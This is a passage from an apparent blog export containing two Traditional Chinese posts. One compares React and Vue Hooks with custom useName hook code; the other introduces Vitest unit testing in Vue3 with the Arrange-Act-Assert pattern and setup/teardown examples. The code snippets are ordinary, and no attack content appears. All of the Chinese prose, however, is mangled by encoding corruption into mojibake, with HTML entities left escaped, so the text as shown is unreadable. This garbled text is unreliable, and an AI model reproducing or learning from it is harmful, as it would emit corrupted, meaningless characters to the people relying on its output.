å¯ä»¥ä¸€é»é»æ·±å…¥ä½¿ç”¨ã€‚\nç„¡è«–æ˜¯ vue é‚„æ˜¯ reactï¼Œéƒ½åªæ˜¯æä¾›äº† Hooks APIï¼Œä¸¦å°‡å®ƒå€‘çš„å„ªåŠ£åˆ©å¼Šæ“ºåœ¨äº†é‚£è£¡ã€‚ä¸¦æ²’æœ‰é€šéç„¡æ³•æ¥å—çš„ break change ä¾†å¼·è¿«ä½ å¿…é ˆä½¿ç”¨ Hooks å»æ”¹å¯«ä¹‹å‰çš„ class çµ„ä»¶ã€‚\nä½ ä¾ç„¶å¯ä»¥åœ¨é …ç›®è£¡ä¸€é‚Šå¯« class çµ„ä»¶ï¼Œä¸€é‚Šå¯« Hooks çµ„ä»¶ï¼Œåœ¨é …ç›®çš„æ¼”é€²å’Œé–‹ç™¼éç¨‹ä¸­ï¼Œé€™æ˜¯ä¸€ä»¶æ²’æœ‰ç—›æ„Ÿï¼Œå»æ‚„ç„¡è²æ¯æ”¹è®Šè‘—ä¸€åˆ‡çš„äº‹æƒ…ã€‚\nä½†æ˜¯äº‹æƒ…ç™¼å±•çš„è¶¨å‹¢å»å¾ˆæ˜é¡¯ï¼Œè¶Šä¾†è¶Šå¤šçš„äººåŠ å…¥äº† Hooks å’Œ ç»„åˆå¼ API çš„å¤§è»ã€‚\nå¦‚ä½•é–‹å§‹ç© hooksï¼Ÿ ç’°å¢ƒå’Œç‰ˆæœ¬ åœ¨ react é …ç›®ä¸­ï¼Œreact çš„ç‰ˆæœ¬éœ€è¦é«˜æ–¼ 16.8.0ã€‚\nè€Œåœ¨ vue é …ç›®ä¸­ï¼Œvue3.x æ˜¯æœ€å¥½çš„é¸æ“‡ï¼Œä½† vue2.6+ é…åˆ @vue/composition-apiï¼Œä¹Ÿå¯ä»¥é–‹å§‹äº«å— \u0026ldquo;çµ„åˆå¼ API\u0026rdquo; çš„å¿«æ¨‚ã€‚\nreact çš„ Hooks å¯«æ³• å› ç‚º react Hooks åƒ…æ”¯æŒ \u0026ldquo;å‡½æ•¸å¼\u0026rdquo; çµ„ä»¶ï¼Œå› æ­¤éœ€è¦å‰µå»ºä¸€å€‹å‡½æ•¸å¼çµ„ä»¶ my-component.jsã€‚\nmy-component.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import { useState, useEffect, useMemo } from \u0026#39;React\u0026#39; export default () =\u0026gt; { // é€šé useState å¯ä»¥å‰µå»ºä¸€å€‹ ç‹€æ…‹å±¬æ€§ å’Œä¸€å€‹ è³¦å€¼æ–¹æ³• const [ name, setName ] = useState(\u0026#39;\u0026#39;) // é€šé useEffect å¯ä»¥å°å‰¯ä½œç”¨é€²è¡Œè™•ç† useEffect(() =\u0026gt; { console.log(name) }, [ name ]) // é€šé useMemo èƒ½ç”Ÿæˆä¸€å€‹ä¾è³´ name çš„è®Šé‡ message const message = useMemo(() =\u0026gt; { return `hello, my name is ${name}` }, [name]) return \u0026lt;div\u0026gt;{ message }\u0026lt;/div\u0026gt; } ç´°ç¯€å¯åƒè€ƒ react å®˜æ–¹ç¶²ç«™\nvue çš„ Hooks å¯«æ³• vue çš„ Hooks å¯«æ³•ä¾è³´æ–¼ç»„åˆå¼APIï¼Œå› æ­¤æœ¬ä¾‹æ¡ç”¨ \u0026lt;script setup\u0026gt; ä¾†å¯«ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; {{ message }} \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { computed, ref } from \u0026#39;vue\u0026#39; // å®šç¾©äº†ä¸€å€‹ ref å°è±¡ const name = ref(\u0026#39;\u0026#39;) // å®šç¾©äº†ä¸€å€‹ä¾è³´ name.value çš„è¨ˆç®—å±¬æ€§ const message = computed(() =\u0026gt; { return `hello, my name is ${name.value}` }) \u0026lt;/script\u0026gt; å¾ˆæ˜é¡¯ï¼Œvue çµ„åˆå¼API è£¡å®Œæˆ useState å’Œ useMemo ç›¸é—œå·¥ä½œçš„ API ä¸¦æ²’æœ‰é€šé useXxx ä¾†å‘½åï¼Œè€Œæ˜¯éµå¾äº† Vue ä¸€è„ˆç›¸æ‰¿è€Œä¾†çš„ ref å’Œ computedã€‚\né›–ç„¶ä¸ç¬¦åˆ react Hook å®šç¾©çš„ Hook ç´„å®šï¼Œä½† vue çš„ api ä¸æŒ‰ç…§ react çš„ç´„å®šå¥½åƒä¹Ÿä¸¦æ²’æœ‰ä»€éº¼ä¸å¦¥ã€‚\nåƒè€ƒç¶²å€\näº”ã€é–‹å§‹ç¬¬ä¸€å€‹è‡ªå®šç¾© hook é™¤äº†å®˜æ–¹æä¾›çš„ Hooks Apiï¼ŒHooks çš„å¦å¤–ä¸€å€‹é‡è¦ç‰¹è³ªï¼Œå°±æ˜¯å¯ä»¥è‡ªå·±é€²è¡Œ \u0026ldquo;è‡ªå®šç¾© Hooks\u0026rdquo; çš„å®šç¾©ï¼Œå¾è€Œå®Œæˆç‹€æ…‹é‚è¼¯çš„è¤‡ç”¨ã€‚\né–‹æºç¤¾å€ä¹Ÿéƒ½æœ‰å¾ˆå¤šä¸éŒ¯çš„åŸºæ–¼ Hooks çš„å°è£ï¼Œæ¯”å¦‚ ahooksï¼Œåˆæ¯”å¦‚ VueUse\né‚£éº¼ï¼Œæˆ‘å€‘æ‡‰è©²æ€éº¼é–‹å§‹æ’°å¯« \u0026ldquo;è‡ªå®šç¾© Hooks\u0026rdquo; å‘¢ï¼Ÿå¾€ä¸‹çœ‹å§ï¼\nreact ç©å®¶çœ‹é€™è£¡ react å®˜æ–¹ç¶²ç«™å°±å°ˆé–€æœ‰ä¸€å€‹ç« ç¯€è¬›è¿° \u0026ldquo;è‡ªå®šç¾© Hook\u0026quot;ã€‚\né€™è£¡ï¼Œæˆ‘å€‘æ‰”ç”¨æ–‡ç« é–‹é ­é‚£å€‹ useName çš„éœ€æ±‚ç‚ºä¾‹ï¼Œå¸Œæœ›é”åˆ°æ•ˆæœï¼š\n1 2 3 const { name, setName } = useName(); // éš¨æ©Ÿç”Ÿæˆä¸€å€‹ç‹€æ…‹å±¬æ€§ nameï¼Œå®ƒæœ‰ä¸€å€‹éš¨æ©Ÿåä½œç‚ºåˆå§‹å€¼ // ä¸¦ä¸”æä¾›äº†ä¸€å€‹å¯éš¨æ™‚æ›´æ–°è©²å€¼çš„æ–¹æ³• setName å¦‚æœæˆ‘å€‘è¦å¯¦ç¾ä¸Šé¢æ•ˆæœï¼Œæˆ‘å€‘è©²æ€éº¼å¯«ä»£ç¢¼å‘¢ï¼Ÿ\n1 2 3 4 5 6 7 8 9 10 11 12 import React from \u0026#39;react\u0026#39;; export const useName = () =\u0026gt; { // é€™å€‹ useMemo å¾ˆé—œéµ const randomName = React.useMemo(() =\u0026gt; genRandomName(), []); const [ name, setName ] = React.useState(randomName) return { name, setName } } å¿ä¸ä½è¦å†æ¬¡æ„Ÿå˜†ä¸€æ¬¡ï¼Œå’Œ mixins ç›¸æ¯”ï¼Œå®ƒä¸åƒ…ä½¿ç”¨èµ·ä¾†æ›´æ£’ï¼Œå°±é€£å®šç¾©èµ·ä¾†ä¹Ÿé‚£éº¼ç°¡å–®ã€‚\nå¯èƒ½æœ‰æœ‹å‹æœƒå¥½å¥‡ï¼Œç‚ºä»€éº¼ä¸ç›´æ¥é€™æ¨£å¯«ï¼š\n1 const [ name, setName ] = React.useState(genRandomName()) å› ç‚ºé€™æ¨£å¯«æ˜¯ä¸å°çš„ï¼Œæ¯æ¬¡ä½¿ç”¨è©² Hook çš„å‡½æ•¸çµ„ä»¶è¢«æ¸²æŸ“ä¸€æ¬¡æ™‚ï¼ŒgenRandom() æ–¹æ³•å°±æœƒè¢«åŸ·è¡Œä¸€æ¬¡ï¼Œé›–ç„¶ä¸å½±éŸ¿ name çš„å€¼ï¼Œä½†å­˜åœ¨æ€§èƒ½æ¶ˆè€—ï¼Œç”šè‡³ç”¢ç”Ÿå…¶ä»– bugã€‚\nç‚ºæ­¤ï¼Œæˆ‘å¯«äº†ä¸€å€‹èƒ½è¤‡ç¾éŒ¯èª¤çš„ demoï¼Œæœ‰èˆˆè¶£çš„æœ‹å‹å¯ä»¥é©—è­‰ï¼š\nå¯ä»¥é€šé React.useState(() =\u0026gt; randomName()) å‚³åƒä¾†é¿å…é‡è¤‡åŸ·è¡Œï¼Œé€™æ¨£å°±ä¸éœ€è¦ useMemo äº†ï¼\nvue ç©å®¶çœ‹é€™è£¡ vue3 å®˜ç¶² æ²’æœ‰é—œæ–¼ è‡ªå®šç¾© Hook çš„ç©æ³•ä»‹ç´¹ï¼Œä½†å¯¦è¸èµ·ä¾†ä¹Ÿä¸¦ä¸å›°é›£ã€‚\nç›®æ¨™ä¹Ÿå®šä½å¯¦ç¾ä¸€å€‹ useName æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 import { ref } from \u0026#39;vue\u0026#39;; export const useName = () =\u0026gt; { const name = ref(genRandomName()) const setName = (v) =\u0026gt; { name.value = v } return { name, setName } } vue å’Œ react è‡ªå®šç¾© Hook çš„å·®ç•° ç›¸ä¼¼é»ï¼šç¸½é«”æ€è·¯æ˜¯ä¸€è‡´çš„éƒ½éµç…§è‘— å®šç¾©ç‹€æ…‹æ•¸æ“šã€æ“ä½œç‹€æ…‹æ•¸æ“šã€éš±è—ç´°ç¯€ ä½œç‚ºæ ¸å¿ƒæ€è·¯ã€‚ å·®ç•°é»ï¼šç»„åˆå¼ API å’Œ React å‡½æ•°ç»„ä»¶ï¼Œæœ‰è‘—æœ¬è³ªå·®ç•°ï¼š Vue3 çš„çµ„ä»¶è£¡ï¼Œsetup æ˜¯ä½œç‚ºä¸€å€‹æ—©æ–¼ \u0026ldquo;created\u0026rdquo; çš„ç”Ÿå‘½é€±æœŸå­˜åœ¨çš„ï¼Œç„¡è«–å¦‚ä½•ï¼Œåœ¨ä¸€å€‹çµ„ä»¶çš„æ¸²æŸ“éç¨‹ä¸­åªæœƒé€²å…¥ä¸€æ¬¡ã€‚ React å‡½æ•°ç»„ä»¶å‰‡å®Œå…¨ä¸åŒï¼Œå¦‚æœæ²’æœ‰è¢« memorizedï¼Œå®ƒå€‘å¯èƒ½æœƒè¢«ä¸åœåœ°è§¸ç™¼ï¼Œä¸åœåœ°é€²å…¥ä¸¦åŸ·è¡Œæ–¹æ³•ï¼Œå› æ­¤éœ€è¦é–‹éŠ·çš„å¿ƒæ™ºç›¸æ¯”æ–¼ Vue å…¶å¯¦æ˜¯æ›´å¤šçš„ã€‚ ","date":"2022-12-30T00:00:00Z","image":"https://live.staticflickr.com/65535/52595598278_3dc955c418_o.png","permalink":"https://wayneblog.ga/2022-12-30/why-use-hooks/","title":"æ·ºè«‡ç‚ºä»€éº¼ Vue å’Œ React éƒ½é¸æ“‡äº† Hooksï¼Ÿ"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nç¶²ç«™å»ºç½®ä¸æ˜¯ä»¶ç°¡å–®çš„äº‹ï¼Œæˆ‘å€‘éƒ½çŸ¥é“ç¶²ç«™åšå¥½ä¹‹å¾Œï¼Œæœ‰å¥½å¤šç´°ç¯€éœ€è¦å…¼é¡§ï¼Œæ‰€ä»¥è¨±å¤šå…¬å¸èŠ±äº†å¤§é‡çš„æ™‚é–“èˆ‡é‡‘éŒ¢ï¼Œè€—ç”¨äººåŠ›å°ç¶­è­·ä¸­çš„ç¶²ç«™é€²è¡Œä¸æ–·çš„ã€é‡è¤‡çš„äººå·¥æ¸¬è©¦ï¼Œæƒ³é”åˆ°çš„ç›®çš„ä¸å¤–ä¹æ˜¯å¸Œæœ›ç¶²ç«™ä¸è¦å‡ºéŒ¯ï¼Œå¯ä»¥çµ¦å®¢æˆ¶/ä½¿ç”¨è€…æœ€å¥½çš„ç¶²ç«™ä½¿ç”¨é«”é©—ã€‚æœ¬ç¯‡ç« èªªæ˜ä½¿ç”¨ Vue3 é–‹ç™¼çš„å°ˆæ¡ˆï¼Œå°å…¥ Vitest é€²è¡Œæ¥µé€Ÿå–®å…ƒæ¸¬è©¦çš„é«”é©—ï¼\næ¸¬è©¦çš„ç¨®é¡ åœ¨ä¸åŒçš„æ¸¬è©¦é¡å‹ä¸­ï¼Œæ‰€éœ€è¦ä¿è­·çš„é¢å‘ä¸å¤ªç›¸åŒï¼Œä»¥ä¸‹æ˜¯ä¸åŒæ¸¬è©¦é¡å‹çš„å¤§è‡´ä»‹ç´¹ï¼š\nå–®å…ƒæ¸¬è©¦ (Unit testing) ä»¥ç¨‹å¼ç¢¼çš„æœ€å°å–®ä½é€²è¡Œæ¸¬è©¦ï¼Œä¿è­·ç¨‹å¼é‚è¼¯ä¸æœƒåœ¨ç³»çµ±ç¶­è­·çš„éç¨‹ä¸­é­åˆ°ç ´å£ï¼Œä¹Ÿé€²ä¸€æ­¥ç¢ºä¿ç¶­è­·ä¸­çš„ç¨‹å¼ç¢¼å“è³ªã€‚\né€™ç¨®æ¸¬è©¦é¡å‹é€šå¸¸ç”±é–‹ç™¼äººå“¡è‡ªè¡Œæ’°å¯«ï¼Œè‡ªå·±å¯«çš„ Code è‡ªå·±å¯«æ¸¬è©¦ï¼Œæœ‰ç¶“é©—çš„é–‹ç™¼äººå“¡å¯ä»¥ç”¨éå¸¸æœ‰æ•ˆç‡çš„æ–¹å¼æ’°å¯«å–®å…ƒæ¸¬è©¦ï¼Œå› ç‚ºæ¸¬è©¦ç¯„åœå°ï¼Œé€™ç¨®é¡å‹çš„æ¸¬è©¦é€šå¸¸ä¸éœ€è¦è¨­ç«‹æ¸¬è©¦ç’°å¢ƒï¼Œå› æ­¤å¯ä»¥å¾—åˆ°è¼ƒé«˜çš„æ’°å¯«æ•ˆç‡ï¼Œä¹Ÿæ˜¯æ‰€æœ‰æ¸¬è©¦é¡å‹ä¸­æœ€å®¹æ˜“æ’°å¯«çš„æ¸¬è©¦é¡å‹ã€‚ä¸éï¼Œå°æ–¼ä¸€å€‹æ²’æœ‰ç¶“é©—çš„é–‹ç™¼è€…ä¾†èªªï¼Œæ’°å¯«å–®å…ƒæ¸¬è©¦å¯èƒ½æœƒè€—ç”¨å¤§é‡æ™‚é–“ï¼Œå¯«æ¸¬è©¦ç¨‹å¼çš„æ™‚é–“å¾ˆæœ‰å¯èƒ½æœƒé å¤§æ–¼å¯¦éš›æ’°å¯«ç¨‹å¼ç¢¼çš„æ™‚é–“ï¼Œæœ‰è »å¤šäººæœƒå› ç‚ºé€™æ¨£è€Œæ”¾æ£„æ’°å¯«å–®å…ƒæ¸¬è©¦ã€‚\næ•´åˆæ¸¬è©¦ (Integration testing) æ•´åˆå¤šæ–¹è³‡æºé€²è¡Œæ¸¬è©¦ï¼Œç¢ºä¿æ¨¡çµ„èˆ‡æ¨¡çµ„ä¹‹é–“çš„äº’å‹•è¡Œç‚ºæ­£ç¢ºç„¡èª¤ï¼Œä¹Ÿè®“ä¸åŒæ¨¡çµ„åœ¨å„è‡ªé–‹ç™¼ç¶­è­·çš„éç¨‹ä¸­ä¸æœƒå› ç‚ºåŠŸèƒ½èª¿æ•´è€Œé­åˆ°ç ´å£ã€‚\né€™ç¨®é¡å‹çš„æ¸¬è©¦é€šå¸¸ä»‹æ–¼å–®å…ƒæ¸¬è©¦èˆ‡ç«¯å°ç«¯æ¸¬è©¦ä¹‹é–“ï¼Œæœ‰æ™‚å€™æœƒç”±å°ˆè·çš„æ¸¬è©¦äººå“¡é€²è¡Œé–‹ç™¼ï¼Œä½†å¤§éƒ¨åˆ†é‚„æ˜¯ç”±é–‹ç™¼åœ˜éšŠä¸­è² è²¬ç‰¹å®šæ¨¡çµ„çš„äººä¾†æ’°å¯«ã€‚æœ‰æ™‚å€™å–®ä¸€æ¨¡çµ„å³ä¾¿å®Œå…¨é€šéå–®å…ƒæ¸¬è©¦ï¼Œç¨ç«‹é‹ä½œä¹Ÿæ­£å¸¸ï¼Œä½†æ˜¯ç•¶éœ€è¦èˆ‡å…¶ä»–æ¨¡çµ„äº’å‹•æ™‚ï¼Œä¹Ÿæ˜¯æœ‰å¯èƒ½ç™¼ç”ŸéŒ¯èª¤ï¼Œé€™æ™‚å°±æ˜¯æ•´åˆæ¸¬è©¦çš„ä¸»è¦è² è²¬é ˜åŸŸã€‚\nä»¥ä¸‹æ˜¯æœªé€šéæ•´åˆæ¸¬è©¦çš„æ¡ˆä¾‹ï¼š(å…©å€‹å…ƒä»¶åœ¨æ•´åˆæ™‚ç™¼ç¾å•é¡Œ)\nç«¯å°ç«¯æ¸¬è©¦ (End-to-end testing) (E2E testing) æ‰€è¬‚çš„ã€Œç«¯å°ç«¯ã€(E2E) æ˜¯æŒ‡å¾ä½¿ç”¨è€…çš„è§’åº¦å‡ºç™¼(ä¸€ç«¯)ï¼Œå°çœŸå¯¦ç³»çµ±(å¦ä¸€ç«¯)é€²è¡Œæ¸¬è©¦ã€‚\né€™ç¨®é¡å‹çš„æ¸¬è©¦å°è¨±å¤šå…¬å¸ä¾†èªªï¼Œå°±æ˜¯ã€Œäººå·¥æ¸¬è©¦ã€çš„ä¸»è¦ç¯„åœï¼Œå› ç‚ºä½ å¯ä»¥é€éäººå·¥å°å·²ç¶“å®Œæ•´éƒ¨å±¬çš„ç¶²ç«™é€²è¡Œæ¸¬è©¦ï¼Œå› æ­¤å¯ä»¥é©—è­‰å‡ºç³»çµ±æ˜¯å¦ç¬¦åˆå®¢æˆ¶çš„å¯¦éš›éœ€æ±‚ã€‚é€™éƒ¨åˆ†ä¹Ÿå¯ä»¥é€éæ’°å¯« E2E æ¸¬è©¦ç¨‹å¼ä¾†é€²è¡Œè‡ªå‹•åŒ–ï¼Œå¢åŠ æ¸¬è©¦æ•ˆç‡ã€‚\né€™è£¡æœ‰å€‹æœªé€šé E2E æ¸¬è©¦çš„æ¡ˆä¾‹ç›¸ç•¶æœ‰è¶£ï¼Œé›–ç„¶æ¯å€‹æ•´å¥—ç³»çµ±æ¯å€‹æ¨¡çµ„éƒ½é€šéæ‰€æœ‰å–®å…ƒæ¸¬è©¦èˆ‡æ•´åˆæ¸¬è©¦ï¼Œä½†æœ€å¾Œçµ„è£èµ·ä¾†å¾Œï¼Œå¾ä½¿ç”¨è€…çš„è§’åº¦ç„¡æ³•æ¥å—ï¼\næ¸¬è©¦æ¡ˆä¾‹ä¸­çš„ 3A æ¨¡å¼ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 describe(\u0026#39;è²“å’ª\u0026#39;, () =\u0026gt; { it(\u0026#39;æ‘¸æ‘¸ï¼Œæ‡‰è©²æœƒç™¼å‡ºã€Œå‘¼åš•åš•ã€è²\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;é¤µé£Ÿï¼Œæ‡‰è©²æœƒç™¼å‡ºã€Œå‘¼åš•åš•ã€è²\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;æ‹¿ç©å…·é€—ï¼Œæ‡‰è©²æœƒç™¼å‡ºã€Œå‘¼åš•åš•ã€è²\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;ä»€éº¼éƒ½ä¸åšï¼Œæ‡‰è©²æ¨å€’çœ¼å‰çœ‹åˆ°çš„æ‰€æœ‰æ±è¥¿\u0026#39;, () =\u0026gt; { // ... }) }) ç•¶æˆ‘å€‘è¨­ç«‹å¥½æ¸¬è©¦æƒ…å¢ƒèˆ‡æ¸¬è©¦æ¡ˆä¾‹çš„æ•˜è¿°çµæ§‹ä¹‹å¾Œï¼Œè¦é–‹å§‹æ’°å¯«æ¸¬è©¦æ¡ˆä¾‹å…§éƒ¨çš„å¯¦ä½œæ™‚å°±å¯ä»¥åˆ©ç”¨æ‰€è¬‚çš„ 3A æ¨¡å¼ä¾†å®‰æ’ã€‚\n3A æ¨¡å¼ä¸»è¦æ˜¯ç‚º(Arrange-Act-Assert)ä¸‰å€‹è‹±æ–‡å­—çš„ç¸®å¯«ï¼Œè€Œä»–å€‘åˆ†åˆ¥ä»£è¡¨äº†ï¼š\næº–å‚™(Arrange)ï¼šæº–å‚™å¥½å—æ¸¬ç›®æ¨™éœ€è¦çš„ä¸€åˆ‡ï¼ŒåŒ…å«ä¾è³´çš„éš”é›¢ç­‰ æ“ä½œ(Act)ï¼šæ“ä½œå—æ¸¬ç‰©ç›®æ¨™ æ–·è¨€(Assert)ï¼šé æœŸå—æ¸¬ç‰©çš„æŸå€‹ç‹€æ…‹æ˜¯å¦ç‚ºæˆ‘å€‘æ‰€é æœŸ ä»¥ä¸Šæ–¹ç¬¬ä¸€é …æ¸¬è©¦æ¡ˆä¾‹ä¾†å¥—ç”¨ 3A æ¨¡å¼çš„è©±å°±æœƒåƒæ˜¯ï¼š\n1 2 3 4 5 6 7 8 9 10 it(\u0026#39;æ‘¸æ‘¸ï¼Œæ‡‰è©²æœƒç™¼å‡ºã€Œå‘¼åš•åš•ã€è²\u0026#39;, () =\u0026gt; { // Arrange: æº–å‚™å¥½ä¸€éš»è²“ const target = new Cat() // Act: æ‘¸æ‘¸é‚£éš»è²“å’ª target.touch() // Assert: è§€å¯Ÿé‚£éš»è²“æ˜¯å¦ç™¼å‡ºå‘¼åš•åš•å«è² expect(target.speaking).toBe(\u0026#39;å‘¼åš•åš•\u0026#39;) }) é‚£å¦‚æœé€™æ™‚å€™ä½ å¯èƒ½æœƒæƒ³åˆ°æ¯å€‹æ¸¬è©¦æ¡ˆä¾‹éƒ½è¦æº–å‚™ä¸€éš»è²“è²“ï¼Œå°æ–¼æ¸¬è©¦æ¡ˆä¾‹ä¾†èªªå°±æœƒä¸€ç›´ä¸æ–·åœ°å»åšã€Œæº–å‚™(Arrange)ã€é€™å€‹è¡Œç‚ºï¼Œå› æ­¤ä½ å¯èƒ½æœƒå¾ˆç›´è¦ºçš„é€™éº¼è™•ç†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 describe(\u0026#39;è²“å’ª\u0026#39;, () =\u0026gt; { const target = new Cat() it(\u0026#39;æ‘¸æ‘¸ï¼Œæ‡‰è©²æœƒç™¼å‡ºã€Œå‘¼åš•åš•ã€è²\u0026#39;, () =\u0026gt; { target.touch() expect(target.speaking).toBe(\u0026#39;å‘¼åš•åš•\u0026#39;) }) it(\u0026#39;é¤µé£Ÿï¼Œæ‡‰è©²æœƒç™¼å‡ºã€Œå‘¼åš•åš•ã€è²\u0026#39;, () =\u0026gt; { target.feed(\u0026#39;ä¹¾ä¹¾\u0026#39;) expect(target.speaking).toBe(\u0026#39;å‘¼åš•åš•\u0026#39;) }) it(\u0026#39;æ‹¿ç©å…·é€—ï¼Œæ‡‰è©²æœƒç™¼å‡ºã€Œå‘¼åš•åš•ã€è²\u0026#39;, () =\u0026gt; { target.play() expect(target.speaking).toBe(\u0026#39;å‘¼åš•åš•\u0026#39;) }) }) ä½†é€™æ¨£çš„å¾Œæœå°±æ˜¯æ¯å€‹æ¸¬è©¦æ¡ˆä¾‹ä¹‹é–“å°±æœƒæœ‰é—œè¯äº†ï¼Œæ¯”æ–¹è²“è²“å…¶å¯¦æ‘¸å¤ªå¤šä¸‹ä»–ä¹Ÿæœƒè¦ºå¾—å­ç…©ï¼Œå¾è€Œå°è‡´æ¸¬è©¦å¤±æ•—ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 describe(\u0026#39;è²“å’ª\u0026#39;, () =\u0026gt; { const target = new Cat() it(\u0026#39;æ‘¸æ‘¸ä¸‹å·´ï¼Œæ‡‰è©²æœƒç™¼å‡ºã€Œå‘¼åš•åš•ã€è²\u0026#39;, () =\u0026gt; { target.touch() expect(target.speaking).toBe(\u0026#39;å‘¼åš•åš•\u0026#39;) }) it(\u0026#39;å†æ‘¸ä¸€æ¬¡ä¸‹å·´ï¼Œæ‡‰è©²æœƒç™¼å‡ºã€Œå‘¼åš•åš•ã€è²\u0026#39;, () =\u0026gt; { target.touch() expect(target.speaking).toBe(\u0026#39;å‘¼åš•åš•\u0026#39;) }) it(\u0026#39;å†æ‘¸ä¸€æ¬¡ä¸‹å·´ï¼Œæ‡‰è©²æœƒç™¼å‡ºã€Œå‘¼åš•åš•ã€è²\u0026#39;, () =\u0026gt; { target.touch() expect(target.speaking).toBe(\u0026#39;å‘¼åš•åš•\u0026#39;) // é æœŸå‘¼åš•åš•ï¼Œçµæœè²“å’ªç”Ÿæ°£äº† }) }) è€Œè¦å¯«å¥½æ¸¬è©¦æ¡ˆä¾‹çš„å…¶ä¸­å¹¾å€‹æ¦‚å¿µå°±æ˜¯è¦ç›¡é‡è®“æ¯å€‹æ¸¬è©¦æ¡ˆä¾‹ä¹‹é–“ã€Œä¸å—é †åºå½±éŸ¿æ¸¬è©¦çµæœã€èˆ‡ã€Œä¿æŒç¨ç«‹ã€ã€‚\nå› æ­¤å¤§å¤šæ•¸çš„ã€Œæ¸¬è©¦ç’°å¢ƒã€çš„å·¥å…·éƒ½æœƒæä¾›é¡ä¼¼ç›¸é—œçš„ API ä¾†å”åŠ©è™•ç†æ¸¬è©¦é–‹å§‹å‰çš„ã€ŒSetupã€èˆ‡çµæŸå¾Œçš„ã€ŒTeardownã€ç’°ç¯€ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 describe(\u0026#39;è²“å’ª\u0026#39;, () =\u0026gt; { const target = new Cat() beforeEach(() =\u0026gt; { // æ¯å€‹æ¸¬è©¦æ¡ˆä¾‹é–‹å§‹å‰è¦åšçš„äº‹æƒ… target.init() // åˆå§‹åŒ–è²“è²“çš„å„ç¨®ç‹€æ…‹ }) afterEach(() =\u0026gt; { // æ¯å€‹æ¸¬è©¦æ¡ˆä¾‹çµæŸå¾Œè¦åšçš„äº‹æƒ… }) it(\u0026#39;æ‘¸æ‘¸ï¼Œæ‡‰è©²æœƒç™¼å‡ºã€Œå‘¼åš•åš•ã€è²\u0026#39;, () =\u0026gt; { target.touch() // é€™æ™‚å€™çš„ target å·²ç¶“æ˜¯ç¶“é init() çš„ç‰ˆæœ¬äº† expect(target.speaking).toBe(\u0026#39;å‘¼åš•åš•\u0026#39;) }) it(\u0026#39;é¤µé£Ÿï¼Œæ‡‰è©²æœƒç™¼å‡ºã€Œå‘¼åš•åš•ã€è²\u0026#39;, () =\u0026gt; { target.feed(\u0026#39;ä¹¾ä¹¾\u0026#39;) // é€™æ™‚å€™çš„ target å·²ç¶“æ˜¯ç¶“é init() çš„ç‰ˆæœ¬äº† expect(target.speaking).toBe(\u0026#39;å‘¼åš•åš•\u0026#39;) }) it(\u0026#39;æ‹¿ç©å…·é€—ï¼Œæ‡‰è©²æœƒç™¼å‡ºã€Œå‘¼åš•åš•ã€è²\u0026#39;, () =\u0026gt; { target.play() // é€™æ™‚å€™çš„ target å·²ç¶“æ˜¯ç¶“é init() çš„ç‰ˆæœ¬äº† expect(target.speaking).toBe(\u0026#39;å‘¼åš•åš•\u0026#39;) }) }) ç¶œåˆä¸Šè¿° 3A èˆ‡è™•ç† Setup \u0026amp; Teardown çš„è§€å¿µï¼Œä¹‹å¾Œå†å¯«æ¸¬è©¦æ¡ˆä¾‹æ™‚ï¼Œæˆ‘å€‘å¯ä»¥å…ˆå¾åŸºç¤çš„ 3A æ¨¡å¼é–‹å§‹æ’°å¯«ï¼Œè€Œåˆ°æœ‰éœ€è¦è™•ç†é‡è¤‡çš„äº‹å‰æº–å‚™(Setup)èˆ‡å¾ŒçºŒæ¸…ç†æ™‚(Teardown)ï¼Œå°±å¯ä»¥è—‰ç”±å·¥å…·ä¾†æ›¿æˆ‘å€‘çµ±ä¸€è™•ç†ã€‚\nçœ‹åˆ°é€™é‚Šè®€è€…æ‡‰è©²æœƒç™¼ç¾ï¼Œæ¸¬è©¦çš„åŸºæœ¬æ¦‚å¿µå…¶å¯¦ä¸é›£æ‡‚ï¼Œè€Œåœ¨ç­è§£æ¸¬è©¦çš„æ¦‚å¿µå¾Œï¼Œå‰©ä¸‹çš„å°±æ˜¯æŠŠæ¦‚å¿µè½‰æ›ç‚ºæ¸¬è©¦å·¥å…·å¯è®€æ‡‚æ¸¬è©¦ç¨‹å¼ç¢¼å°±å¥½äº†ï¼\nå°ˆæ¡ˆåŠ å…¥ Vitest åœ¨åˆå§‹åŒ–å°ˆæ¡ˆéç¨‹åŠ å…¥ Vitest å»ºç«‹å°ˆæ¡ˆæ™‚è‹¥è¦åŠ å…¥å–®å…ƒæ¸¬è©¦è¦æ³¨æ„åˆ°çš„æ˜¯ï¼šNode.js ç‰ˆæœ¬å¿…é ˆç‚º 14 ä»¥ä¸Šï¼Œå¦å‰‡ Vitest æœƒç„¡æ³•é †åˆ©åŸ·è¡Œï¼\nç¢ºèª Node.js ç‰ˆæœ¬å¾Œï¼Œåœ¨è¦å»ºç«‹å°ˆæ¡ˆçš„çˆ¶å±¤è·¯å¾‘åº•ä¸‹é€éçµ‚ç«¯æ©ŸæŒ‡ä»¤è¼¸å…¥ npm create vite@latest ä¾†å»ºç«‹ä¸€å€‹åŸºæ–¼ Vite æ‰€å»ºæ§‹çš„å°ˆæ¡ˆï¼Œæ¥è‘—çµ‚ç«¯æ©Ÿæœƒå‡ºç¾ä¸€äº›å•é¡Œï¼Œè¦–å°ˆæ¡ˆéœ€æ±‚é¸æ“‡ï¼š\nProject name â‡’ è¼¸å…¥è‡ªè¨‚çš„å°ˆæ¡ˆåç¨±å¾ŒæŒ‰ä¸‹ Enter Select a framework â‡’ é¸æ“‡ Vue å¾ŒæŒ‰ä¸‹ Enter Select a variant â‡’ é¸æ“‡ Customize with create-vue å¾ŒæŒ‰ä¸‹ Enter 